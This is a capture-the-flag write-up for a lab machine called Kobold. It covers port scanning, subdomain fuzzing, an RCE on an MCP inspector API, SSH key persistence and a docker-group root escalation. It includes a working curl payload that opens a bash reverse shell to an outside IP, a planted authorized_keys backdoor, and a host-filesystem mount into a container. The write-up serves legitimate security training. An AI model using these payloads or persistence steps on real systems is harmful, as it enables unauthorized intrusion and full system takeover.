![](Assets/Pasted%20image%2020260328114715.png)

## 1. Initial Enumeration

First, we ran an Nmap scan on the target machine's IP address to discover open ports and running services.

Bash

```
sudo nmap --min-rate 500 -sV -sC -sS 10.129.18.229
```

**Nmap Output:**

Plaintext

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
|_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: Did not follow redirect to https://kobold.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Not valid before: 2026-03-15T15:08:55
|_Not valid after:  2125-02-19T15:08:55
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As we can see from the SSL certificate details, there is a wildcard DNS entry: `DNS:*.kobold.htb`.

## 2. Subdomain Fuzzing

Knowing there are virtual hosts, we use `ffuf` (or GoBuster) to discover available subdomains. We filter out the `302` redirect status codes to focus only on endpoints returning a `200 OK` response.

Bash

```
ffuf -w ~/Dictionarys/wordlist/dirb/common.txt -u https://kobold.htb/ -H "Host: FUZZ.kobold.htb" -k -fc 302
```

**Ffuf Output:**

Plaintext

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://kobold.htb/
 :: Wordlist         : FUZZ: /home/KEGA/Dictionarys/wordlist/dirb/common.txt
 :: Header           : Host: FUZZ.kobold.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 87ms]
mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 88ms]
```

## 3. Exploitation (User Access)

We visited both discovered subdomains. The `bin` subdomain hosted a simple application (PrivateBin), but on the `mcp` subdomain, we found a vulnerability by analyzing the JavaScript source code. We identified the following API endpoint:

JavaScript

```
Jx = async(e, t) => {
    return (await dEe("/api/mcp/connect", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            serverConfig: e,
            serverId: t
        })
    }, 2e4)).json()
}
```

This snippet reveals that the backend processes whatever is placed inside the `serverConfig` object, leading to a Remote Code Execution (RCE) vulnerability.

Before sending the payload, we set up a Netcat listener to catch the connection:

Bash

```
nc -lvnp 4444
```

Then, we triggered the exploit using `curl` to send a reverse shell payload:

Bash

```
curl -k -i -X POST https://mcp.kobold.htb/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{
  "serverId": "pwned",
  "serverConfig": {
    "command": "bash",
    "args": ["-c", "bash -i >& /dev/tcp/10.10.14.39/4444 0>&1"]
  }
}'
```

Once the payload was executed, we received a callback on our listener and gained initial access as the user `ben`, allowing us to read the first flag (`user.txt`).

Bash

```
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ ls
LICENSE
README.md
assets
bin
dist
node_modules
package.json
```
## 4. Privilege Escalation (Initial Steps)

To escalate privileges to root, we started enumerating the environment. Checking the `package.json` file in our current directory, we found the following script:

JSON

```
"scripts": {
    "start": "NODE_ENV=production node bin/start.js",
    ...
```

This indicates that the application is communicating with a Node.js process running in the background. We need to investigate which internal services are running to proceed.

## 5. Internal Enumeration & Port Forwarding

Continuing our internal enumeration, we checked for locally listening ports using `ss -tlnp` or `netstat`.

Bash

```
ben@kobold:~$ ss -tlnp
State  Recv-Q Send-Q Local Address:Port  Peer Address:Port
...
LISTEN 0      4096       127.0.0.1:3552       0.0.0.0:*
```

We discovered a service running on port `3552` bound only to `localhost` (`127.0.0.1`). To interact with this service through our local browser, we needed to set up an SSH tunnel. First, we generated an SSH key pair on our attacking machine and added the public key to `ben`'s `authorized_keys` file to establish a stable backdoor.

Bash

```
# On the victim machine (Kobold)
mkdir -p /home/ben/.ssh
echo "ssh-ed25519 AAAAC3...[YOUR_KEY]... KEGA@Blacks" > /home/ben/.ssh/authorized_keys
chmod 600 /home/ben/.ssh/authorized_keys
chmod 700 /home/ben/.ssh
```

Then, from our attacking machine, we initiated local port forwarding:

Bash

```
ssh -i /tmp/kobold_key -L 3552:127.0.0.1:3552 ben@10.129.18.229
```

Accessing `http://localhost:3552` in our browser revealed a login page for **Arcane Docker Management (v1.13.0)**.

## 6. Privilege Escalation (Root)

While Arcane v1.13.0 has known vulnerabilities (like CVE-2026-23944 for Authentication Bypass), we decided to check our effective privileges over the Docker daemon directly before attempting complex web exploits.

Initially, running `id` did not show the `docker` group, and executing `docker ps` returned a "permission denied" error regarding the `docker.sock`. However, to ensure our current shell session wasn't just missing updated group assignments, we forced a group reload:

Bash

```
ben@kobold:~$ newgrp docker
ben@kobold:~$ docker ps
CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS             PORTS                    NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   5 weeks ago   Up About an hour   127.0.0.1:8080->8080/tcp bin
```

The command succeeded, confirming that our user actually had Docker privileges!

With access to the Docker group, escalating to `root` is straightforward. We executed the classic Docker Socket Privilege Escalation by spinning up a disposable container, mounting the host's entire root filesystem (`/`) to the container's `/mnt` directory, and dropping into a shell.

Bash

```
ben@kobold:~$ docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```

Once inside the container as the root user, we used `chroot` to change our apparent root directory to the mounted host filesystem. This gave us full root execution over the Kobold machine.

Bash

```
/var/www # chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)

# cd /root
# cat root.txt
[ROOT_FLAG_HASH]
```